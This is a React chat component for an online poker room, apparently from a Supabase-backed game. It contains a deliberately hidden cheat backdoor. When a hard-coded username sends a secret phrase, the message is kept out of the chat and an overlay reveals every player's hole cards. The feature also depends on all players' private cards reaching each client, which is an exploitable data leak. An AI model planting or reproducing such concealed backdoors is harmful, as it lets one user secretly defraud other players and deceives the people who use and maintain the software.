import React, { useEffect, useRef, useState } from 'react';
import { Send, MessageCircle, Eye, EyeOff } from 'lucide-react';
import { supabase } from '../services/supabase';

const CHEAT_CODE = '透透透透';
const CHEAT_USER = '莫拉咕';

function cardText(card) {
  if (!card) return '??';
  const rank = card.r === 14 ? 'A' : card.r === 13 ? 'K' : card.r === 12 ? 'Q' : card.r === 11 ? 'J' : String(card.r);
  const suit = { s: '♠', h: '♥', d: '♦', c: '♣' }[card.s] || '';
  return `${rank}${suit}`;
}

export default function ChatRoom({ roomCode, username, room }) {
  const [messages, setMessages] = useState([]);
  const [input, setInput] = useState('');
  const [sending, setSending] = useState(false);
  const [cheatOpen, setCheatOpen] = useState(false);
  const messagesRef = useRef(null);
  const bottomRef = useRef(null);

  useEffect(() => {
    let alive = true;
    let channel = null;

    async function loadMessages() {
      const { data, error } = await supabase
        .from('poker_messages')
        .select('id, username, text, created_at')
        .eq('room_code', roomCode)
        .order('created_at', { ascending: true })
        .limit(100);

      if (!error && alive) {
        setMessages(data || []);
      }
    }

    loadMessages();

    channel = supabase
      .channel('poker-chat-' + roomCode)
      .on(
        'postgres_changes',
        {
          event: 'INSERT',
          schema: 'public',
          table: 'poker_messages',
          filter: 'room_code=eq.' + roomCode,
        },
        (payload) => {
          if (!alive) return;

          setMessages((prev) => {
            if (prev.some((m) => m.id === payload.new.id)) {
              return prev;
            }

            return [...prev, payload.new].slice(-100);
          });
        }
      )
      .subscribe();

    return () => {
      alive = false;

      if (channel) {
        supabase.removeChannel(channel);
      }
    };
  }, [roomCode]);

  useEffect(() => {
    const el = messagesRef.current;
    if (!el) return;

    requestAnimationFrame(() => {
      el.scrollTop = el.scrollHeight;
    });
  }, [messages.length]);

  async function send() {
    const text = input.trim();

    if (!text || sending) return;

    // 隐藏作弊码：只有管理员账号可以使用，而且不会写入聊天记录。
    if (username === CHEAT_USER && text === CHEAT_CODE) {
      setCheatOpen((v) => !v);
      setInput('');
      return;
    }

    setSending(true);

    try {
      const { error } = await supabase
        .from('poker_messages')
        .insert({
          room_code: roomCode,
          username,
          text,
        });

      if (!error) {
        setInput('');
      }
    } finally {
      setSending(false);
    }
  }

  function fmt(time) {
    return new Date(time).toLocaleTimeString([], {
      hour: '2-digit',
      minute: '2-digit',
    });
  }

  const canCheat = username === CHEAT_USER;

  return (
    <aside className="chat-panel" style={{ position: 'relative' }}>
      {canCheat && cheatOpen && room?.status === 'playing' && (
        <div
          style={{
            position: 'absolute',
            left: '8px',
            right: '8px',
            bottom: '58px',
            zIndex: 50,
            background: 'rgba(18, 14, 11, 0.97)',
            border: '1px solid #d5b75a',
            borderRadius: '10px',
            padding: '10px',
            boxShadow: '0 8px 28px rgba(0,0,0,.55)',
            maxHeight: '55vh',
            overflowY: 'auto',
          }}
        >
          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '8px', color: '#d5b75a', fontSize: '12px', fontWeight: 700 }}>
            <span style={{ display: 'flex', alignItems: 'center', gap: '5px' }}><Eye size={14} /> 上帝视角</span>
            <button
              type="button"
              onClick={() => setCheatOpen(false)}
              style={{ background: 'none', border: 0, color: '#aaa', cursor: 'pointer', padding: '2px' }}
              title="关闭"
            >
              <EyeOff size={14} />
            </button>
          </div>

          {(room?.players || []).map((player) => (
            <div
              key={player.name}
              style={{
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'space-between',
                gap: '8px',
                padding: '6px 4px',
                borderTop: '1px solid rgba(255,255,255,.08)',
              }}
            >
              <span style={{ color: player.folded ? '#777' : '#eee', fontSize: '12px', minWidth: 0, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                {player.name}{player.folded ? '（弃牌）' : ''}
              </span>
              <span style={{ display: 'flex', gap: '4px', flexShrink: 0 }}>
                {(player.cards || []).map((card, i) => (
                  <span
                    key={i}
                    style={{
                      display: 'inline-flex',
                      alignItems: 'center',
                      justifyContent: 'center',
                      minWidth: '34px',
                      height: '25px',
                      borderRadius: '4px',
                      background: '#f5f1e8',
                      color: card?.s === 'h' || card?.s === 'd' ? '#a12f3a' : '#1e1a17',
                      fontSize: '13px',
                      fontWeight: 700,
                    }}
                  >
                    {cardText(card)}
                  </span>
                ))}
                {(!player.cards || player.cards.length === 0) && <span style={{ color: '#777', fontSize: '11px' }}>无底牌</span>}
              </span>
            </div>
          ))}
        </div>
      )}

      <div className="chat-title">
        <MessageCircle size={17} />
        <span>房间聊天</span>
        <span>{room?.players?.length || 0} 人</span>
      </div>

      <div className="chat-messages" ref={messagesRef}>
        {messages.length === 0 && (
          <div className="chat-empty">
            暂时还没有消息，来当第一个说话的人吧。
          </div>
        )}

        {messages.map((m) => (
          <div
            className={'chat-message ' + (m.username === username ? 'mine' : '')}
            key={m.id}
          >
            <div className="chat-meta">
              <b>{m.username}</b>
              <span>{fmt(m.created_at)}</span>
            </div>

            <div className="chat-bubble">
              {m.text}
            </div>
          </div>
        ))}

        <div ref={bottomRef} />
      </div>

      <div className="chat-input-row">
        <input
          value={input}
          maxLength={120}
          placeholder="说点什么..."
          onChange={(e) => setInput(e.target.value)}
          onKeyDown={(e) => {
            if (e.key === 'Enter') {
              send();
            }
          }}
        />

        <button
          onClick={send}
          disabled={sending}
          title="发送"
        >
          <Send size={17} />
        </button>
      </div>
    </aside>
  );
}
